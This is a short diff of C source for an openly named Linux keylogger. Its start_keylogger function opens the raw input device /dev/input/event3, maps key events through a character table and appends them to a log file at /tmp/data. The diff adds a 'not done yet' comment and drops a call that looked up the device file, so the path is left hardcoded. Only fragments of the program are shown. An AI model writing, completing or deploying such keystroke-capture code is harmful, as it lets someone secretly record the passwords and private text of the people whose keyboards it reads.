@@ -6,6 +6,7 @@
 
 #define LOGFILE "/tmp/data"
 
+// not done yet
 char *get_event_file() {
 	FILE *fptr = fopen("/proc/bus/input/devices", "r");
 	// Error handling?
@@ -21,7 +22,6 @@ char *get_event_file() {
 int start_keylogger() {
 	struct input_event ev;
 	char *m = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./";
-	char *event_filename = get_event_file();
 	int fd = open("/dev/input/event3", O_RDONLY);
 
 	FILE *fp = fopen(LOGFILE, "a");
